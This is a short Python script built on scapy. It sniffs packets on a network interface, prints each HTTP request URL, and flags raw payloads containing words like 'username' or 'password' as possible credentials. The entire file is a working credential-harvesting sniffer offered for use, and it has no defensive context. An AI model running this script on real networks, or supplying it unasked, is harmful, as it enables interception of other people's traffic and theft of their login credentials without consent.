#! /usr/bin/env python

import scapy.all as scapy
from scapy.layers import http

def sniff(interface):
    """
    Sniff network packets on a given interface.

    Args:
        interface (str): The network interface to sniff on (e.g., 'eth0').

    Returns:
        None
    """
    # Sniff packets on the specified interface without storing them and process each packet
    scapy.sniff(iface=interface, store=False, prn=process_sniffed_packet)

def get_url(packet):
    """
    Extract the URL from an HTTP request packet.

    Args:
        packet (scapy.Packet): The packet from which to extract the URL.

    Returns:
        str: The full URL (Host + Path) of the HTTP request.
    """
    # Combine the Host and Path fields from the HTTP request to construct the full URL
    return packet[http.HTTPRequest].Host + packet[http.HTTPRequest].Path

def get_logon_info(packet):
    """
    Search for potential login information in raw packet data.

    Args:
        packet (scapy.Packet): The packet to inspect for login information.

    Returns:
        str or None: The packet's raw data if any login-related keywords are found, otherwise None.
    """
    # Check if the packet contains raw data
    if packet.haslayer(scapy.Raw):
        # Convert the raw data into a string
        load = str(packet[scapy.Raw].load)
        
        # List of common keywords that may indicate login credentials
        keywords = ["username", "user", "login", "password", "pass"]
        
        # Search for any of the keywords in the packet's raw load
        for keyword in keywords:
            if keyword in load:
                return load
    return None

def process_sniffed_packet(packet):
    """
    Process each sniffed packet to check for HTTP requests and potential login credentials.

    Args:
        packet (scapy.Packet): The packet to process.

    Returns:
        None
    """
    # Check if the packet contains an HTTP request
    if packet.haslayer(http.HTTPRequest):
        # Extract the URL from the HTTP request and print it
        url = get_url(packet)
        print("[+] HTTP Request >> " + url.decode())

        # Attempt to extract possible login information
        login_info = get_logon_info(packet)

        if login_info:
            # Print potential login credentials if found
            print("\n\n[+] Possible Username / Password >> " + login_info + "\n\n")

# Start sniffing on the 'eth0' interface (change it based on your network interface)
sniff("eth0")
